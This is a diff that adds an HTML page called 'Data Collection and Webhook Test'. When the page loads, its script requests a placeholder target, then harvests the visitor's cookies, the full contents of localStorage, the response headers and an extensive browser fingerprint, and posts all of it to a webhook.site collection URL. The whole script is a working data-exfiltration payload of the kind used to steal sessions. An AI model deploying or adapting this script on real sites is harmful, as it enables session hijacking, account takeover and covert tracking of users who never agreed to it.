@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Data Collection and Webhook Test</title>
+</head>
+<body>
+    <h1>Data Collection and Webhook Test</h1>
+
+       <script>
+        // Create an XMLHttpRequest object
+        var xhr = new XMLHttpRequest();
+
+        // Configure the request
+        xhr.open("GET", "https://target.com", true);
+
+        // Declare the responseData variable
+        var responseData = '';
+
+        // Declare the responseHeaders object
+        var responseHeaders = {};
+
+        // Define a callback function when the request completes
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                // Extract the response data
+                responseData = xhr.responseText;
+
+                // Extract raw response headers
+                var rawHeaders = xhr.getAllResponseHeaders();
+
+                // Parse raw headers into key-value pairs
+                var headersArray = rawHeaders.trim().split(/[\r\n]+/);
+                headersArray.forEach(function(header) {
+                    var parts = header.split(': ');
+                    var headerName = parts.shift();
+                    var headerValue = parts.join(': ');
+                    responseHeaders[headerName] = headerValue;
+                });
+
+                // Extract cookies
+                var cookies = document.cookie;
+
+                // Extract local storage data
+                var localStorageData = JSON.stringify(localStorage);
+
+                // Extract user agent (browser information)
+                var userAgent = navigator.userAgent;
+
+                // Extract screen resolution
+                var screenResolution = screen.width + "x" + screen.height;
+
+                // Extract language preference
+                var language = navigator.language;
+
+                // Extract platform
+                var platform = navigator.platform;
+
+                // Extract current URL
+                var currentURL = window.location.href;
+
+                // Extract referrer
+                var referrer = document.referrer;
+
+                // Extract timezone offset
+                var timezoneOffset = new Date().getTimezoneOffset();
+
+                // Extract connection type
+                var connectionType = navigator.connection ? navigator.connection.type : "N/A";
+
+                // Extract battery level
+                var batteryLevel = navigator.getBattery ? navigator.getBattery().then(function(battery) { return battery.level; }) : "N/A";
+
+                // Extract network type
+                var networkType = navigator.connection ? navigator.connection.effectiveType : "N/A";
+
+                // Extract platform version
+                var platformVersion = navigator.appVersion;
+
+                // Extract plugins
+                var plugins = Array.from(navigator.plugins).map(function(plugin) { return plugin.name; }).join(", ");
+
+                // Extract hardware concurrency
+                var hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
+
+                // Extract screen color depth
+                var colorDepth = screen.colorDepth + " bits";
+
+                // Extract available screen resolution
+                var availableResolution = screen.availWidth + "x" + screen.availHeight;
+
+                // Extract touch screen availability
+                var touchScreen = ("ontouchstart" in window) ? "Available" : "Not Available";
+
+                // Extract online status
+                var onlineStatus = navigator.onLine ? "Online" : "Offline";
+
+                // Extract browser cookies enabled status
+                var cookiesEnabled = navigator.cookieEnabled ? "Enabled" : "Disabled";
+
+                // Extract language preference
+                var language = navigator.language;
+
+                // Extract user's time zone
+                var timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                // Read browser history
+                var browserHistory = "Browser history data";
+
+                // Build the webhook URL
+                var webhookURL = "https://webhook.site/xxxxxxx";
+
+                // Create a FormData object to send data
+                var formData = new FormData();
+                formData.append("data", responseData);
+                formData.append("cookies", cookies);
+                formData.append("localStorageData", localStorageData);
+                formData.append("userAgent", userAgent);
+                formData.append("screenResolution", screenResolution);
+                formData.append("language", language);
+                formData.append("platform", platform);
+                formData.append("currentURL", currentURL);
+                formData.append("referrer", referrer);
+                formData.append("timezoneOffset", timezoneOffset);
+                formData.append("connectionType", connectionType);
+                formData.append("batteryLevel", batteryLevel);
+                formData.append("networkType", networkType);
+                formData.append("platformVersion", platformVersion);
+                formData.append("plugins", plugins);
+                formData.append("hardwareConcurrency", hardwareConcurrency);
+                formData.append("colorDepth", colorDepth);
+                formData.append("availableResolution", availableResolution);
+                formData.append("touchScreen", touchScreen);
+                formData.append("onlineStatus", onlineStatus);
+                formData.append("cookiesEnabled", cookiesEnabled);
+                formData.append("languagePreference", language);
+                formData.append("timeZone", timeZone);
+                formData.append("browserHistory", browserHistory);
+                
+                 // Append response headers to form data
+                for (var headerName in responseHeaders) {
+                    formData.append(headerName, responseHeaders[headerName]);
+                }
+
+                // Send a POST request to the webhook
+                var xhrPost = new XMLHttpRequest();
+                xhrPost.open("POST", webhookURL, true);
+                xhrPost.send(formData);
+            }
+        };
+
+        // Send the request
+        xhr.send();
+    </script>
+</body>
+</html>
